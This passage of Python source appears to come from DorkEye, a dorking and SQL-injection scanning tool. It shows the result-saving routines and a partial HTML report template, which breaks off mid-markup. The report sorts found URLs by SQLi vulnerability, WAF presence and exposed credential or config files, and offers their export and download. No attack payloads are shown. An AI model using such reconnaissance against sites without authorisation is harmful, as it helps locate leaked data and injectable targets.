                _interruptible_sleep(long_delay)

                if _exit_requested:
                    console.print("[bold red][!!] Exit requested — stopping search.[/bold red]")
                    break
                if _skip_current:
                    console.print("[yellow][~] Extended delay skipped.[/yellow]")
                    _skip_current = False

                self._total_results_at_last_extended_delay = len(self.results)

    def save_results(self):
        """Persist self.results to disk in the format determined by the output file extension."""
        if not self.output_file:
            return
        downloads_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Dump")
        os.makedirs(downloads_folder, exist_ok=True)
        filename = os.path.join(downloads_folder, self.output_file)
        ext      = os.path.splitext(filename)[1].lower()
        if not ext:
            filename += ".json"
            ext       = ".json"
        try:
            if   ext == ".csv":  self._save_csv(filename)
            elif ext == ".json": self._save_json(filename)
            elif ext == ".html": self._save_html(filename)
            elif ext == ".txt":  self._save_txt(filename)
            else:
                console.print(f"[red][!] Unsupported output format: {ext}[/red]")
        except Exception as _save_err:
            import traceback as _tb
            console.print(f"[red][!] Error saving results to {filename}[/red]")
            console.print(f"[red]    {_save_err}[/red]")
            console.print(f"[dim]{_tb.format_exc()}[/dim]")

    def _save_csv(self, filename: str):
        """Write results to a CSV file with all metadata columns."""
        if not self.results:
            return
        fieldnames = [
            "url","title","snippet","dork","timestamp","extension","category",
            "file_size","content_type","accessible","status_code",
            "sqli_vulnerable","sqli_confidence","waf_detected"
        ]
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction='ignore')
            writer.writeheader()
            for result in self.results:
                row = result.copy()
                if "sqli_test" in result:
                    row["sqli_vulnerable"] = result["sqli_test"].get("vulnerable", False)
                    row["sqli_confidence"] = result["sqli_test"].get("overall_confidence", "none")
                    row["waf_detected"]    = result["sqli_test"].get("waf_detected", "")
                writer.writerow(row)

    def _save_json(self, filename: str):
        """Write results plus session metadata to a structured JSON file."""
        data = {
            "metadata": {
                "total_results":               len(self.results),
                "generated_at":                datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "sqli_detection_enabled":      self.config.get("sqli_detection", False),
                "sqli_vulnerabilities_found":  self.stats.get("sqli_vulnerable", 0),
                "waf_blocked_count":           self.stats.get("waf_detected", 0),
                "http_fingerprinting_enabled": self.config.get("http_fingerprinting", True),
                "stealth_mode":                self.config.get("stealth_mode", False),
                "android_mode":                TERMUX_IS_ANDROID,
                "statistics":                  dict(self.stats)
            },
            "results": self.results
        }
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

    def _save_txt(self, filename: str):
        """Write results to a plain-text numbered list with per-result details."""
        if not self.results:
            return
        with open(filename, "w", encoding="utf-8") as f:
            for idx, result in enumerate(self.results, 1):
                f.write(f"{idx}. {result.get('url')}\n")
                if result.get("title"):
                    f.write(f"   Title: {result.get('title')}\n")
                if result.get("category"):
                    f.write(f"   Category: {result.get('category')}\n")
                if "sqli_test" in result:
                    sqli = result["sqli_test"]
                    if sqli.get("tested", False):
                        status = "VULNERABLE" if sqli.get("vulnerable") else "SAFE"
                        f.write(f"   SQLi: {status} ({sqli.get('overall_confidence')})\n")
                    if sqli.get("waf_detected"):
                        f.write(f"   WAF: {sqli.get('waf_detected')}\n")
                f.write("\n")

    def _save_html(self, filename: str):
        """Build and write the full interactive dark-theme HTML report to filename."""
        sqli_count = self.stats.get("sqli_vulnerable", 0)
        sqli_safe  = sum(
            1 for r in self.results
            if "sqli_test" in r and r["sqli_test"].get("tested") and not r["sqli_test"].get("vulnerable")
        )
        sqli_total = sqli_count + sqli_safe
        waf_count  = self.stats.get("waf_detected", 0)
        cnt        = {"all": len(self.results), "doc": 0, "sqli": sqli_total, "scripts": 0, "page": 0}
        for r in self.results:
            cat = r.get("category", "unknown")
            if cat in ("documents", "archives", "backups"):    cnt["doc"]     += 1
            elif cat in ("scripts", "configs", "credentials"): cnt["scripts"] += 1
            elif cat == "webpage":                             cnt["page"]    += 1

        import json as _json
        import html as _html_mod

        # ── Link export rows ──────────────────────────────────────────────
        export_rows = []
        for r in self.results:
            sqli_t = r.get("sqli_test", {})
            if sqli_t.get("tested"):
                conf   = sqli_t.get("overall_confidence", "")
                sqli_s = ("critical" if conf == "critical" else "vuln") if sqli_t.get("vulnerable") else "safe"
            else:
                sqli_s = "untested"
            export_rows.append({
                "url":       r.get("url", ""),
                "title":     r.get("title", ""),
                "dork":      r.get("dork", ""),
                "category":  r.get("category", ""),
                "ext":       r.get("extension", ""),
                "timestamp": r.get("timestamp", ""),
                "sqli":      sqli_s,
                "conf":      sqli_t.get("overall_confidence", ""),
                "waf":       sqli_t.get("waf_detected", "") or "",
            })

        # ── File export rows (non-webpage results with file info) ─────────
        file_rows = []
        for r in self.results:
            cat = r.get("category", "webpage")
            if cat == "webpage":
                continue
            file_rows.append({
                "url":         r.get("url", ""),
                "title":       r.get("title", ""),
                "category":    cat,
                "ext":         r.get("extension", ""),
                "size":        r.get("file_size"),
                "size_str":    self._format_size(r.get("file_size")),
                "accessible":  r.get("accessible", False),
                "status_code": r.get("status_code"),
                "timestamp":   r.get("timestamp", ""),
            })

        export_data_js = _json.dumps(export_rows, ensure_ascii=False).replace("</", "<\\/")
        file_data_js   = _json.dumps(file_rows,   ensure_ascii=False).replace("</", "<\\/")
        report_base    = os.path.splitext(os.path.basename(filename))[0]

        # ── Build HTML ────────────────────────────────────────────────────
        parts = []
        parts.append("""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DorkEye | Report</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Courier New', monospace; background: #000; color: #00ff41; min-height: 100vh; overflow-x: hidden; }
        #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.32; pointer-events: none; }
        #content { position: relative; z-index: 1; padding: 28px 32px; max-width: 1400px; margin: 0 auto; }
        /* Header */
        .header { background: rgba(0,10,0,0.85); border: 1px solid #00ff41; border-left: 4px solid #00ff41;
            padding: 22px 28px; margin-bottom: 24px; box-shadow: 0 0 24px rgba(0,255,65,0.15); }
        .header h1 { font-size: 22px; color: #00ff41; text-shadow: 0 0 10px #00ff41; letter-spacing: 2px; }
        .header .subtitle { margin-top: 6px; font-size: 12px; color: #009922; letter-spacing: 1px; }
        .header .blink { animation: blink 1.1s step-end infinite; }
        @keyframes blink { 50% { opacity: 0; } }
        /* Stats */
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr)); gap: 12px; margin-bottom: 24px; }
        .stat-card { background: rgba(0,10,0,0.82); border: 1px solid #00aa2a; padding: 16px 18px; }
        .stat-card h3 { font-size: 11px; color: #009922; letter-spacing: 1px; text-transform: uppercase; }
        .stat-card p { font-size: 26px; font-weight: bold; color: #00ff41; margin-top: 8px; text-shadow: 0 0 8px rgba(0,255,65,0.5); }
        /* Alerts */
        .sqli-alert { background: rgba(40,0,0,0.88); border: 1px solid #ff2222; border-left: 4px solid #ff2222;
            padding: 14px 20px; margin-bottom: 20px; color: #ff4444; }
        .sqli-alert h2 { font-size: 15px; letter-spacing: 2px; margin-bottom: 6px; }
        .sqli-alert p  { font-size: 13px; color: #ff6666; }
        .waf-alert { background: rgba(30,20,0,0.88); border: 1px solid #ffaa00; border-left: 4px solid #ffaa00;
            padding: 12px 20px; margin-bottom: 14px; color: #ffcc44; font-size: 13px; }
        /* ══ TOOLBAR ══ */
        .toolbar { display: flex; align-items: flex-start; gap: 8px; margin-bottom: 6px; flex-wrap: wrap; }
        /* LEFT: green filters */
        .filter-bar { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; flex: 1; position: relative; }
        .filter-label { color: #009922; font-size: 12px; letter-spacing: 1px; margin-right: 4px; white-space: nowrap; }
        .filter-group { position: relative; display: inline-block; }
        .filter-btn { background: rgba(0,10,0,0.7); border: 1px solid #00aa2a; color: #00aa2a; padding: 5px 13px;
            font-family: 'Courier New', monospace; font-size: 11px; cursor: pointer; letter-spacing: 2px;
            text-transform: uppercase; transition: all .15s; white-space: nowrap; display: inline-flex; align-items: center; gap: 5px; }
        .filter-btn:hover { background: rgba(0,255,65,0.12); border-color: #00ff41; color: #00ff41; }
        .filter-btn.active { background: #00ff41; color: #000; border-color: #00ff41; font-weight: bold; }
        .badge { display: inline-block; background: rgba(0,255,65,0.15); border: 1px solid #009922; color: #00ff41;
            font-size: 9px; padding: 1px 5px; border-radius: 2px; min-width: 20px; text-align: center; }
        .filter-btn.active .badge { background: rgba(0,0,0,0.25); color: #000; }
        .has-sub .arrow { font-size: 8px; opacity: 0.7; }
        .sub-menu { display: none; position: absolute; top: calc(100% + 3px); left: 0; z-index: 200;
            background: rgba(0,6,0,0.97); border: 1px solid #00aa2a; border-top: 2px solid #00ff41;
            box-shadow: 0 6px 24px rgba(0,255,65,0.18); min-width: 165px; }
        .sub-menu.open { display: block; }
        .sub-btn { display: flex; align-items: center; justify-content: space-between; width: 100%;
            background: transparent; border: none; border-bottom: 1px solid rgba(0,170,42,0.18);
            color: #009922; padding: 8px 16px; font-family: 'Courier New', monospace; font-size: 11px;
            letter-spacing: 1.5px; text-transform: uppercase; cursor: pointer; text-align: left; transition: all .12s; gap: 8px; }
        .sub-btn:last-child { border-bottom: none; }
        .sub-btn:hover { background: rgba(0,255,65,0.08); color: #00ff41; padding-left: 22px; }
        .sub-btn.active { color: #00ff41; font-weight: bold; background: rgba(0,255,65,0.06); padding-left: 22px; }
        .sub-btn .sub-badge { font-size: 9px; color: #005500; background: rgba(0,255,65,0.08);
            border: 1px solid #003300; padding: 1px 5px; border-radius: 2px; min-width: 22px; text-align: center; }
        .active-sub-info { font-size: 11px; color: #005500; letter-spacing: 1px; margin-bottom: 10px; min-height: 16px; padding-left: 2px; }
        .active-sub-info span { color: #00aa44; }
        /* RIGHT: three blue buttons */
        .right-btns { display: flex; gap: 6px; flex-shrink: 0; align-items: flex-start; }
        .srch-wrap, .export-wrap, .files-wrap { position: relative; flex-shrink: 0; }
        .rbt { background: rgba(0,10,18,0.85); border: 1px solid #0077bb; color: #00aaff;
            padding: 5px 13px; font-family: 'Courier New', monospace; font-size: 11px; cursor: pointer;
            letter-spacing: 2px; text-transform: uppercase; display: inline-flex; align-items: center;
            gap: 5px; transition: all .15s; white-space: nowrap; }
        .rbt:hover, .rbt.open { background: rgba(0,100,180,0.2); border-color: #00aaff; color: #fff; }
        /* Generic floating panel */
        .rpanel { display: none; position: absolute; top: calc(100% + 4px); right: 0; z-index: 400;
            background: rgba(0,4,12,0.98); border: 1px solid #007acc; border-top: 2px solid #00aaff;
            box-shadow: 0 10px 40px rgba(0,120,200,0.25); min-width: 370px; }
        .rpanel.open { display: block; animation: fadeIn .15s ease; }
        @keyframes fadeIn { from { opacity:0; transform:translateY(-4px); } to { opacity:1; transform:none; } }
        .panel-close { position: absolute; top: 7px; right: 10px; background: transparent; border: none;
            color: #004466; font-size: 14px; cursor: pointer; line-height: 1; padding: 2px 5px;
            font-family: 'Courier New', monospace; transition: color .12s; z-index: 10; }
        .panel-close:hover { color: #00aaff; }
        .ep-section { padding: 10px 16px; border-bottom: 1px solid rgba(0,100,180,0.2); }
        .ep-section:last-child { border-bottom: none; }
        .ep-title { font-size: 10px; color: #005588; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 8px; }
        .ep-row { display: flex; align-items: center; gap: 6px; margin-bottom: 5px; }
        .ep-row:last-child { margin-bottom: 0; }
        .ep-label { font-size: 11px; color: #0088bb; letter-spacing: 1px; min-width: 115px; flex-shrink: 0; }
        .ep-label.warn { color: #ffaa00; }
        .ep-label.danger { color: #ff4444; }
        .ep-label.safe-lbl { color: #00cc55; }
        .ep-label.view-lbl { color: #cc88ff; }
        .exp-btn { background: transparent; border: 1px solid currentColor; padding: 3px 9px;
            font-family: 'Courier New', monospace; font-size: 10px; cursor: pointer; letter-spacing: 1.5px;
            text-transform: uppercase; transition: all .12s; }
        .exp-btn.txt  { color: #00ccff; border-color: #00ccff; } .exp-btn.txt:hover  { background: #00ccff; color: #000; }
        .exp-btn.json { color: #ffcc00; border-color: #ffcc00; } .exp-btn.json:hover { background: #ffcc00; color: #000; }
        .exp-btn.csv  { color: #00ff99; border-color: #00ff99; } .exp-btn.csv:hover  { background: #00ff99; color: #000; }
        /* Search panel */
        .srch-panel { min-width: 320px; }
        .srch-inner { padding: 14px 16px; }
        .srch-title { font-size: 10px; color: #005588; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 10px; }
        .srch-input-wrap { display: flex; gap: 6px; align-items: center; }
        .srch-input { flex: 1; background: rgba(0,10,20,0.9); border: 1px solid #007acc; color: #00aaff;
            font-family: 'Courier New', monospace; font-size: 12px; padding: 6px 10px; outline: none; letter-spacing: 1px; }
        .srch-input:focus { border-color: #00aaff; box-shadow: 0 0 8px rgba(0,170,255,0.2); }
        .srch-input::placeholder { color: #003355; }
        .srch-clear { background: transparent; border: 1px solid #004466; color: #006688; padding: 6px 10px;
            font-family: 'Courier New', monospace; font-size: 10px; cursor: pointer; letter-spacing: 1px; transition: all .12s; }
        .srch-clear:hover { border-color: #00aaff; color: #00aaff; }
        .srch-meta { margin-top: 8px; font-size: 10px; color: #004466; letter-spacing: 1px; }
        .srch-meta span { color: #0088bb; }
        .srch-scope { margin-top: 10px; display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
        .srch-scope-lbl { font-size: 9px; color: #004466; letter-spacing: 1px; }
        .scope-btn { background: transparent; border: 1px solid #004466; color: #006688; padding: 3px 8px;
            font-family: 'Courier New', monospace; font-size: 9px; cursor: pointer; letter-spacing: 1px;
            text-transform: uppercase; transition: all .12s; }
        .scope-btn.active { background: rgba(0,122,204,0.3); border-color: #007acc; color: #00aaff; }
        .scope-btn:hover { border-color: #0099cc; color: #0099cc; }
        /* Files panel */
        .files-panel { min-width: 420px; max-height: 520px; flex-direction: column; }
        .rpanel.open.files-panel { display: flex; }
        .files-hdr { padding: 10px 16px; border-bottom: 1px solid rgba(0,100,180,0.2); flex-shrink: 0; }
        .files-bulk { padding: 8px 16px; border-bottom: 1px solid rgba(0,100,180,0.2); flex-shrink: 0;
            display: flex; align-items: center; gap: 6px; flex-wrap: wrap; }
        .bulk-lbl { font-size: 10px; color: #005588; letter-spacing: 1px; flex: 1; }
        .files-list { overflow-y: auto; flex: 1; }
        .file-row { display: flex; align-items: center; gap: 8px; padding: 7px 14px;
            border-bottom: 1px solid rgba(0,100,180,0.1); transition: background .1s; }
        .file-row:hover { background: rgba(0,100,180,0.06); }
        .file-row:last-child { border-bottom: none; }
        .file-chk { accent-color: #007acc; cursor: pointer; flex-shrink: 0; }
        .file-info { flex: 1; min-width: 0; }
        .file-url { font-size: 10px; color: #0088bb; overflow: hidden; text-overflow: ellipsis;
            white-space: nowrap; display: block; text-decoration: none; }
        .file-url:hover { color: #00aaff; }
        .file-cat { font-size: 9px; color: #004466; margin-top: 2px; letter-spacing: 1px; }
        .file-size { font-size: 10px; color: #005588; flex-shrink: 0; min-width: 55px; text-align: right; }
        .file-dl { background: transparent; border: none; color: #005588; font-size: 14px;
            cursor: pointer; text-decoration: none; flex-shrink: 0; transition: color .12s;
            line-height: 1; padding: 0 2px; }
        .file-dl:hover { color: #00aaff; }
        .files-empty { padding: 20px 16px; font-size: 11px; color: #004466; text-align: center; letter-spacing: 1px; }
        /* Table */
        .table-wrap { background: rgba(0,8,0,0.82); border: 1px solid #00aa2a; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; table-layout: auto; }
        col.c-num   { width: 36px; }
        col.c-url   { min-width: 180px; }
        col.c-title { min-width: 120px; width: 14%; }
        col.c-cat   { min-width: 90px;  width: 9%; }
        col.c-sqli  { min-width: 110px; width: 10%; }
        col.c-waf   { min-width: 70px;  width: 7%; }
        col.c-size  { min-width: 54px;  width: 6%; }
        /* ── responsive breakpoints ── */
        @media (max-width: 1100px) {
            col.c-title { width: 130px; }
            col.c-cat   { width: 95px; }
            col.c-sqli  { width: 115px; }
            col.c-waf   { width: 76px; }
            col.c-size  { width: 58px; }
        }
        @media (max-width: 860px) {
            col.c-title { display: none; }
            col.c-waf   { display: none; }
            td:nth-child(3), th:nth-child(3),
            td:nth-child(6), th:nth-child(6) { display: none; }
        }
        th { background: rgba(0,255,65,0.06); color: #00ff41; padding: 11px 10px; text-align: left;
            border-bottom: 1px solid #00aa2a; font-size: 11px; letter-spacing: 2px;
            text-transform: uppercase; white-space: nowrap; }
        td { padding: 9px 10px; border-bottom: 1px solid rgba(0,170,42,0.15); font-size: 12px;
            vertical-align: middle; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        tr:hover td { background: rgba(0,255,65,0.04); }
        tr.hidden { display: none; }
        tr.srch-hidden { display: none; }
        a { color: #00aaff; text-decoration: none; }
        a:hover { color: #00ff41; }
        .category { display: inline-block; padding: 2px 7px; border: 1px solid; font-size: 10px;
            letter-spacing: 1px; text-transform: uppercase; white-space: nowrap; }
        .category-documents   { border-color: #ff6b6b; color: #ff6b6b; }
        .category-archives    { border-color: #ffa500; color: #ffa500; }
        .category-databases   { border-color: #b47fff; color: #b47fff; }
        .category-backups     { border-color: #e67e22; color: #e67e22; }
        .category-configs     { border-color: #1abc9c; color: #1abc9c; }
        .category-scripts     { border-color: #f1c40f; color: #f1c40f; }
        .category-webpage     { border-color: #7f8c8d; color: #7f8c8d; }
        .category-credentials { border-color: #e74c3c; color: #e74c3c; }
        .sqli-critical { color: #ff00ff; font-weight: bold; text-shadow: 0 0 6px #ff00ff; }
        .sqli-vuln     { color: #ff3333; font-weight: bold; }
        .sqli-safe     { color: #00ff41; }
        .sqli-untested { color: #444; }
        .waf-label     { font-size: 10px; color: #ffaa00; border: 1px solid #ffaa00; padding: 1px 5px; letter-spacing: 1px; white-space: nowrap; }
        .url-cell { display: flex; align-items: center; gap: 6px; overflow: hidden; }
        .url-cell a { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; min-width: 0; }
        .dl-btn { flex-shrink: 0; background: transparent; border: none; color: #005588;
            font-size: 15px; cursor: pointer; text-decoration: none; line-height: 1;
            padding: 0; transition: color .12s; }
        .dl-btn:hover { color: #00aaff; }
        /* Info popup */
        .info-btn { flex-shrink: 0; background: transparent; border: none; color: #004455;
            font-size: 13px; cursor: pointer; line-height: 1; padding: 0 1px;
            transition: color .12s; font-family: 'Courier New', monospace; }
        .info-btn:hover { color: #00ccff; }
        .info-popup { display: none; position: fixed; z-index: 9000;
            background: rgba(0,4,12,0.98); border: 1px solid #007acc;
            border-top: 2px solid #00aaff; box-shadow: 0 10px 40px rgba(0,120,200,0.3);
            min-width: 360px; max-width: 520px; font-size: 11px; padding: 14px 16px; }
        .info-popup.open { display: block; animation: fadeIn .15s ease; }
        .info-popup-title { font-size: 10px; color: #005588; letter-spacing: 2px;
            text-transform: uppercase; margin-bottom: 10px; border-bottom: 1px solid rgba(0,100,180,0.2);
            padding-bottom: 6px; display: flex; justify-content: space-between; align-items: center; }
        .info-close { background: transparent; border: none; color: #004466; cursor: pointer;
            font-size: 14px; font-family: 'Courier New', monospace; padding: 0 3px; transition: color .12s; }
        .info-close:hover { color: #00aaff; }
        .info-row { display: flex; gap: 8px; margin-bottom: 5px; align-items: flex-start; }
        .info-lbl { color: #005588; min-width: 90px; flex-shrink: 0; letter-spacing: 1px; }
        .info-val { color: #00aaff; word-break: break-all; }
        /* Footer */
        .footer { margin-top: 28px; padding: 14px 0; border-top: 1px solid #002200;
            text-align: center; font-size: 11px; color: #004400; letter-spacing: 2px; }
        /* Toast */
        #toast { position: fixed; bottom: 28px; right: 28px; z-index: 9999; background: rgba(0,20,0,0.95);
            border: 1px solid #00ff41; color: #00ff41; padding: 10px 20px; font-family: 'Courier New', monospace;
            font-size: 12px; letter-spacing: 1px; opacity: 0; transition: opacity .3s; pointer-events: none; }
        #toast.show { opacity: 1; }
        ::-webkit-scrollbar { width: 5px; height: 5px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: #003300; }
        ::-webkit-scrollbar-thumb:hover { background: #00aa2a; }
    </style>
</head>
<body>
<canvas id="matrix-canvas"></canvas>
<div id="content">
    <div class="header">
        <h1>&#9632; DorkEye | Report <span class="blink">_</span></h1>
""")
        parts.append(f'        <div class="subtitle">&#10132; Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")} &nbsp;|&nbsp; xploits3c.github.io/DorkEye</div>\n')
        parts.append("    </div>\n")

        if sqli_count > 0:
            parts.append(f"""    <div class="sqli-alert">
        <h2>&#9888; SECURITY ALERT &#9888;</h2>
        <p><strong>{sqli_count}</strong> potential SQL injection vulnerabilities detected!</p>
        <p>Review the results marked VULNERABLE below — use the Export panel to download them.</p>
    </div>
""")
        if waf_count > 0:
            parts.append(f"""    <div class="waf-alert">
        &#9888; <strong>{waf_count}</strong> WAF-protected target(s) detected — SQLi results on those URLs may have false negatives.
    </div>
""")
        parts.append(f"""    <div class="stats">
        <div class="stat-card"><h3>&#9632; TOTAL RESULTS</h3><p>{len(self.results)}</p></div>
        <div class="stat-card"><h3>&#9632; DUPLICATES FILTERED</h3><p>{self.stats.get("duplicates", 0)}</p></div>
        <div class="stat-card"><h3>&#9632; SQLI VULNERABILITIES</h3><p style="color:#ff3333;text-shadow:0 0 8px rgba(255,0,0,0.4)">{sqli_count}</p></div>
        <div class="stat-card"><h3>&#9632; WAF DETECTED</h3><p style="color:#ffaa00">{waf_count}</p></div>
        <div class="stat-card"><h3>&#9632; EXECUTION TIME</h3><p>{round(time.time() - self.start_time, 2)}s</p></div>
    </div>

    <!-- TOOLBAR -->
    <div class="toolbar">
      <!-- LEFT: green category filters -->
      <div class="filter-bar">
        <span class="filter-label">[ FILTER ]</span>
        <button class="filter-btn active" data-group="all" onclick="applyFilter(this)">ALL <span class="badge" id="badge-all">{cnt["all"]}</span></button>
        <div class="filter-group" id="fg-doc">
            <button class="filter-btn has-sub" data-group="doc" onclick="applyFilter(this)">DOC <span class="badge" id="badge-doc">{cnt["doc"]}</span><span class="arrow">&#9660;</span></button>
            <div class="sub-menu" id="sub-doc">
                <button class="sub-btn active" data-sub="doc-all"  onclick="applySubFilter(this,'doc')">ALL      <span class="sub-badge" id="sbadge-doc-all">{cnt["doc"]}</span></button>
                <button class="sub-btn"        data-sub="doc-pdf"  onclick="applySubFilter(this,'doc')">PDF      <span class="sub-badge" id="sbadge-doc-pdf">–</span></button>
                <button class="sub-btn"        data-sub="doc-docx" onclick="applySubFilter(this,'doc')">DOCX     <span class="sub-badge" id="sbadge-doc-docx">–</span></button>
                <button class="sub-btn"        data-sub="doc-xlsx" onclick="applySubFilter(this,'doc')">XLSX     <span class="sub-badge" id="sbadge-doc-xlsx">–</span></button>
                <button class="sub-btn"        data-sub="doc-ppt"  onclick="applySubFilter(this,'doc')">PPT      <span class="sub-badge" id="sbadge-doc-ppt">–</span></button>
                <button class="sub-btn"        data-sub="doc-arc"  onclick="applySubFilter(this,'doc')">ARCHIVES <span class="sub-badge" id="sbadge-doc-arc">–</span></button>
            </div>
        </div>
        <div class="filter-group" id="fg-sqli">
            <button class="filter-btn has-sub" data-group="sqli" onclick="applyFilter(this)">SQLi <span class="badge" id="badge-sqli">{cnt["sqli"]}</span><span class="arrow">&#9660;</span></button>
            <div class="sub-menu" id="sub-sqli">
                <button class="sub-btn active" data-sub="sqli-all"     onclick="applySubFilter(this,'sqli')">SQLi ALL      <span class="sub-badge" id="sbadge-sqli-all">{sqli_total}</span></button>
                <button class="sub-btn"        data-sub="sqli-critical" onclick="applySubFilter(this,'sqli')">SQLi CRITICAL <span class="sub-badge sqli-critical" id="sbadge-sqli-critical">–</span></button>
                <button class="sub-btn"        data-sub="sqli-vuln"    onclick="applySubFilter(this,'sqli')">SQLi VULN     <span class="sub-badge sqli-vuln" id="sbadge-sqli-vuln">{sqli_count}</span></button>
                <button class="sub-btn"        data-sub="sqli-safe"    onclick="applySubFilter(this,'sqli')">SQLi SAFE     <span class="sub-badge" id="sbadge-sqli-safe">{sqli_safe}</span></button>
            </div>
        </div>
        <div class="filter-group" id="fg-scripts">
            <button class="filter-btn has-sub" data-group="scripts" onclick="applyFilter(this)">SCRIPTS <span class="badge" id="badge-scripts">{cnt["scripts"]}</span><span class="arrow">&#9660;</span></button>
            <div class="sub-menu" id="sub-scripts">
                <button class="sub-btn active" data-sub="scripts-all"    onclick="applySubFilter(this,'scripts')">ALL     <span class="sub-badge" id="sbadge-scripts-all">{cnt["scripts"]}</span></button>
                <button class="sub-btn"        data-sub="scripts-php"    onclick="applySubFilter(this,'scripts')">PHP     <span class="sub-badge" id="sbadge-scripts-php">–</span></button>
                <button class="sub-btn"        data-sub="scripts-asp"    onclick="applySubFilter(this,'scripts')">ASP     <span class="sub-badge" id="sbadge-scripts-asp">–</span></button>
                <button class="sub-btn"        data-sub="scripts-sh"     onclick="applySubFilter(this,'scripts')">SH/BAT  <span class="sub-badge" id="sbadge-scripts-sh">–</span></button>
                <button class="sub-btn"        data-sub="scripts-config" onclick="applySubFilter(this,'scripts')">CONFIGS <span class="sub-badge" id="sbadge-scripts-config">–</span></button>
                <button class="sub-btn"        data-sub="scripts-creds"  onclick="applySubFilter(this,'scripts')">CREDS   <span class="sub-badge" id="sbadge-scripts-creds">–</span></button>
            </div>
        </div>
        <button class="filter-btn" data-group="page" onclick="applyFilter(this)">PAGE <span class="badge" id="badge-page">{cnt["page"]}</span></button>
      </div>

      <!-- RIGHT: three separate blue buttons -->
      <div class="right-btns">

        <!-- 1. SEARCH DATA -->
        <div class="srch-wrap" id="srchWrap">
          <button class="rbt" id="srchToggle" onclick="toggleSearch()">&#128269; SEARCH</button>
          <div class="rpanel srch-panel" id="srchPanel">
            <button class="panel-close" onclick="document.getElementById('srchPanel').classList.remove('open');document.getElementById('srchToggle').classList.remove('open')" title="Close">&#10005;</button>
            <div class="srch-inner">
              <div class="srch-title">&#9632; Search — Filter results by keyword</div>
              <div class="srch-input-wrap">
                <input class="srch-input" id="srchInput" type="text" placeholder="Type to filter results..." oninput="doSearch()" autocomplete="off" spellcheck="false">
                <button class="srch-clear" onclick="clearSearch()">CLEAR</button>
              </div>
              <div class="srch-meta">Matching: <span id="srchCount">–</span> of {len(self.results)} results</div>
              <div class="srch-scope">
                <span class="srch-scope-lbl">SCOPE:</span>
                <button class="scope-btn active" data-scope="url"      onclick="toggleScope(this)">URL</button>
                <button class="scope-btn active" data-scope="title"    onclick="toggleScope(this)">TITLE</button>
                <button class="scope-btn active" data-scope="category" onclick="toggleScope(this)">CATEGORY</button>
                <button class="scope-btn active" data-scope="dork"     onclick="toggleScope(this)">DORK</button>
              </div>
            </div>
          </div>
        </div>

        <!-- 2. EXPORT LINKS -->
        <div class="export-wrap" id="exportWrap">
          <button class="rbt" id="exportToggle" onclick="toggleExportPanel()">&#11015; LINKS</button>
          <div class="rpanel" id="exportPanel">
            <button class="panel-close" onclick="document.getElementById('exportPanel').classList.remove('open');document.getElementById('exportToggle').classList.remove('open')" title="Close">&#10005;</button>
            <div class="ep-section">
              <div class="ep-title">&#9632; Export Links — All results</div>
              <div class="ep-row">
                <span class="ep-label">All ({len(self.results)})</span>
                <button class="exp-btn txt" onclick="doExport('txt','all')">TXT</button>
                <button class="exp-btn json" onclick="doExport('json','all')">JSON</button>
                <button class="exp-btn csv" onclick="doExport('csv','all')">CSV</button>
              </div>
            </div>
            <div class="ep-section">
              <div class="ep-title">&#9632; Export Links — SQLi by status</div>
              <div class="ep-row">
                <span class="ep-label warn">⚠ All tested <span id="epCntSqliAll"></span></span>
                <button class="exp-btn txt"  onclick="doExport('txt','sqli-all')">TXT</button>
                <button class="exp-btn json" onclick="doExport('json','sqli-all')">JSON</button>
                <button class="exp-btn csv"  onclick="doExport('csv','sqli-all')">CSV</button>
              </div>
              <div class="ep-row">
                <span class="ep-label danger">&#9888; VULN only <span id="epCntSqliVuln"></span></span>
                <button class="exp-btn txt"  onclick="doExport('txt','sqli-vuln')">TXT</button>
                <button class="exp-btn json" onclick="doExport('json','sqli-vuln')">JSON</button>
                <button class="exp-btn csv"  onclick="doExport('csv','sqli-vuln')">CSV</button>
              </div>
              <div class="ep-row">
                <span class="ep-label safe-lbl">&#10003; SAFE only <span id="epCntSqliSafe"></span></span>
                <button class="exp-btn txt"  onclick="doExport('txt','sqli-safe')">TXT</button>
                <button class="exp-btn json" onclick="doExport('json','sqli-safe')">JSON</button>
                <button class="exp-btn csv"  onclick="doExport('csv','sqli-safe')">CSV</button>
              </div>
            </div>
            <div class="ep-section">
              <div class="ep-title">&#9632; Export Links — Current view</div>
              <div class="ep-row">
                <span class="ep-label view-lbl">Visible <span id="epCntView"></span></span>
                <button class="exp-btn txt"  onclick="doExport('txt','view')">TXT</button>
                <button class="exp-btn json" onclick="doExport('json','view')">JSON</button>
                <button class="exp-btn csv"  onclick="doExport('csv','view')">CSV</button>
              </div>
            </div>
          </div>
        </div>

        <!-- 3. EXPORT FILES -->
        <div class="files-wrap" id="filesWrap">
          <button class="rbt" id="filesToggle" onclick="toggleFilesPanel()">&#128196; FILES</button>
          <div class="rpanel files-panel" id="filesPanel">
            <div class="files-hdr" style="position:relative">
              <div class="ep-title" style="margin-bottom:0">&#9632; Download Files — Accessible results</div>
              <button class="panel-close" onclick="document.getElementById('filesPanel').classList.remove('open');document.getElementById('filesToggle').classList.remove('open')" title="Close">&#10005;</button>
            </div>
            <div class="files-bulk">
              <span class="bulk-lbl">Selected: <span id="selCount">0</span></span>
              <button class="exp-btn txt"  onclick="selectAllFiles(true)"  style="font-size:9px;padding:2px 7px">ALL</button>
              <button class="exp-btn txt"  onclick="selectAllFiles(false)" style="font-size:9px;padding:2px 7px;color:#555;border-color:#333">NONE</button>
